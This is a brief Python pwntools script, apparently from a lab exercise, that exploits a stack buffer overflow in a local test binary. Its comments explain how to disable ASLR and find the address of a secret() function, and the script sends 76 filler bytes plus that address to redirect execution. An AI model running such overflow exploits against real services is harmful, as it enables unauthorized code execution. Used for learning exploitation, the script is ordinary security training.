from pwn import *

# Prerequisite - Disable ASLR
"""
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space' # Disable
sudo bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space' # Enable
ulimit -c unlimited    
"""

# Prerequisite - Get address of secret() by...
"""
-- Looking in Ghidra at function start
-- objdump -d vuln_noprot | grep secret
-- (gdb) disas secret
"""


context.update(arch='i386', os='linux')
r = remote('127.0.0.1', 4444)

r.recvuntil(b"Username: ")
r.sendline(b"bob")

r.recvuntil(b"Password: ")

offset = 76
secret_addr = p32(0x08049246)           # Redirect to secret() function
payload = b"A" * offset + secret_addr   # [FILLER][ADDRESS]

r.send(payload)

r.close()